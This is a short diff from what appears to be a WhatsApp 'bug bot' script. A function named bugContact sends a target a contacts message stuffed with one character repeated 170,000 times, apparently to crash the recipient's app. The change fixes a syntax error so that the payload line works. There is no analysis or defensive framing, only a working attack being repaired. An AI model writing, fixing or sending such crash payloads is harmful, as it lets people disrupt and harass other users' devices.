@@ -2017,7 +2017,7 @@ async function newsLetter(target) {
     
     
     async function bugContact(target) {
-    let xbug1 = 'ꦾ'.repeat.(170000);
+    let xbug1 = 'ꦾ'.repeat(170000);
     await sock.relayMessage(target, {
         contactsArrayMessage: {
             contacts: [
